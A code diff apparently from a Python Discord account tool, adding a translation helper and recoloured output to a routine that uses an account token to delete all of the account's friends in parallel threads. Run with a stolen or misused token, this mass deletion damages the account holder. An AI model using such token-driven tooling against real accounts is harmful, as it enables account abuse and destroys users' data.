@@ -1,5 +1,12 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
+
 try:
     import requests
     import threading
@@ -21,17 +28,17 @@ try:
             try:
                 requests.delete(
                     f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers={'Authorization': token})
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ADD} Status: {color.WHITE}Delete{color.RED} | User: {color.WHITE}{friend['user']['username']}#{friend['user']['discriminator']}")
+                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {secondary}Delete{primary} | User: {secondary}{friend['user']['username']}#{friend['user']['discriminator']}")
             except Exception as e:
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error: {e}{color.RED}")
+                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {secondary}{tr('Error')} {e}{primary}")
 
     if not requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
-        print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error{color.RED}")
+        print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {secondary}{tr('Error')}{primary}")
 
     processes = []
     friend_id = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={'Authorization': token, 'Content-Type': 'application/json'}).json()
     if not friend_id:
-        print(f"{INFO} No friends found.")
+        print(f"{INFO} {tr('NoFriends')}.")
 
     for friend in [friend_id[i:i+3] for i in range(0, len(friend_id), 3)]:
         t = threading.Thread(target=DeleteFriends, args=(friend, token))
